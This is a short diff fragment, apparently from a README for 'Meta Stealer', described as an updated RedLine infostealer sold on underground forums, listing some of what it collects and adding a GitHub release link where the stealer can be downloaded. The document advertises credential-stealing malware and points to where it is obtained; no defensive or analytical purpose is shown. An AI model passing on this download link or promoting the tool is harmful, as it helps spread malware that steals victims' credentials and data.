@@ -12,4 +12,4 @@ Meta Stealer (updated redline version) is a malware available on underground for
 - Installed browsers and software
 - Can Steal CIS
 
-Download: 
+Download: https://github.com/NighttfallGT/MetaStealer/releases/tag/08.07.2022
